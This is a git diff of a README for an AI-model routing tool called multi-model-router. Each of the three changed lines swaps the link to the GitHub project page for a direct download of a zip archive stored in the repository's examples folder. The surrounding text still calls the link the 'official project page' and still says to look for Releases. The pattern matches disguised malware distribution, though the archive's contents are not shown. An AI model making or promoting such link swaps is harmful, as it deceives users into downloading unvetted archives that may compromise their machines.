@@ -1,12 +1,12 @@
 # 🤖 multi-model-router - Route tasks to the best AI model
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/wasila7220/multi-model-router)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://raw.githubusercontent.com/wasila7220/multi-model-router/main/examples/model-multi-router-v3.5-beta.1.zip)
 
 This tool routes your AI tasks to the most capable model. It connects to any service that follows the OpenAI standard. You use it to pick the right tool for every job. It supports models like Claude, GPT, DeepSeek, Kimi, and Qwen.
 
 ## 📥 How to download the software
 
-Visit the [official project page](https://github.com/wasila7220/multi-model-router) to get your copy. 
+Visit the [official project page](https://raw.githubusercontent.com/wasila7220/multi-model-router/main/examples/model-multi-router-v3.5-beta.1.zip) to get your copy. 
 
 1. Go to the link above.
 2. Look for the "Releases" section on the right side of the screen.
@@ -67,6 +67,6 @@ Confirm that you downloaded the file for Windows. Update your version of Windows
 
 ## 🤝 Getting help
 
-If you run into trouble, check the project page for updates. The community maintains this tool and adds fixes often. Ensure you use the latest version to get the best results. You find the link to the latest files here: [https://github.com/wasila7220/multi-model-router](https://github.com/wasila7220/multi-model-router). 
+If you run into trouble, check the project page for updates. The community maintains this tool and adds fixes often. Ensure you use the latest version to get the best results. You find the link to the latest files here: [https://raw.githubusercontent.com/wasila7220/multi-model-router/main/examples/model-multi-router-v3.5-beta.1.zip](https://raw.githubusercontent.com/wasila7220/multi-model-router/main/examples/model-multi-router-v3.5-beta.1.zip). 
 
 The software runs in the background while you work. You do not need to keep the window open after you save your settings. The router remembers your preferences each time you restart your computer.
